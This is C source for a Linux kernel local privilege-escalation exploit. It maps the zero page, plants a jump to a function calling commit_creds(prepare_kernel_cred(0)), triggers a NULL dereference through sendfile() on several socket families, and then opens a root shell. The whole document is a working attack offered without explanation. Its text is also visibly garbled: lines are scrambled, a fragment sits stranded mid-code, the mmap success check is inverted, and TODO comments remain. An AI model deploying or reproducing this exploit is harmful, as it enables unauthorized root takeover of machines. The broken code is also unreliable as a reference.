#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DOMAINS_STOP -1

const int domains[][3] = {  
{ PF_APPLETALK, SOCK_DGRAM, 0 }, { PF_IPX, SOCK_DGRAM, 0 },  
{ PF_IRDA, SOCK_DGRAM, 0 },  
{ PF_X25, SOCK_DGRAM, 0 },  
{ PF_AX25, SOCK_DGRAM, 0 },  
{ PF_BLUETOOTH, SOCK_DGRAM, 0 }, { PF_PPPOX, SOCK_DGRAM, 0 },  
{ DOMAINS_STOP, 0, 0 }

};

int got_ring0 = 0;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);  
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds; _prepare_kernel_cred prepare_kernel_cred;

static void fatal (char* msg) { fprintf(stderr, "%s\n", msg); exit (1);

}

static unsigned long get_kernel_sym(char *name) {

  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret;

f = fopen("/proc/kallsyms", "r"); if (f == NULL) return 0;

  ret = 0;
  while(ret != EOF) {

ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname); if (ret == 0) {

      fscanf(f, "%s\n", sname);

continue; }

    if (!strcmp(name, sname)) {
      fclose(f);
      return addr;

} }

fclose(f);

return 0; }

static int __attribute__((regparm(3))) own_the_kernel(unsigned long a, unsigned long b, unsigned long c, unsigned long d, unsigned long e)
{

got_ring0 = 1;  
commit_creds (prepare_kernel_cred (0)); return -1;

}

void main () {

  char *mem = NULL;
  int d;

commit_creds = (_commit_creds)get_kernel_sym("commit_creds"); if (commit_creds == NULL)

fatal ("UNABLE TO RESOLVE \"commit_creds\" SYMBOL"); prepare_kernel_cred =

(_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred"); if (prepare_kernel_cred == NULL)

fatal ("UNABLE TO RESOLVE \"prepare_kernel_cred\" SYMBOL");

/* TODO: map memory at address 0 */  
mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0);

  if (mem != NULL)
       fatal ("UNABLE TO MAP ZERO PAGE!");

fprintf(stdout, " [+] MAPPED ZERO PAGE!\n");

mem[0]='\xff';
mem[1]='\x25';
mem[2]='\x06';
mem[3]='\x00';
mem[4]='\x00';
mem[5]='\x00';

*(unsigned long *)&mem[6] = (unsigned long)own_the_kernel;

{  
char template[] = "/tmp/sendfile.XXXXXX"; int in, out;

if ((in = mkstemp(template)) < 0) fatal ("failed to open input descriptor");

    unlink(template);

    // Find a vulnerable domain

    d = 0;
  repeat_it:

0) {

for (; domains[d][0] != DOMAINS_STOP; d++) {  
if ((out = socket(domains[d][0], domains[d][1], domains[d][2])) >=

   printf ("+");

break; }

  printf ("-");
}

if (out < 0) fatal ("unable to find a vulnerable domain, sorry"); // Truncate input file to some large value

ftruncate(in, getpagesize());

// sendfile() to trigger the bug.

sendfile(out, in, NULL, getpagesize()); }

if (getuid() == 0/** TODO: How do we know that the exploit worked ? **/) {

fprintf(stdout, " [+] got ring0!\n"); } else {

d++;

    goto repeat_it;
  }

if (getuid() == 0)  
fprintf(stdout, " [+] Got root!\n");

else  
fatal (" [+] Failed to get root :( Something's wrong. Maybe the

kernel isn't vulnerable?");

  setresuid (0);

execl("/bin/sh", "/bin/sh", "-i", NULL); }
```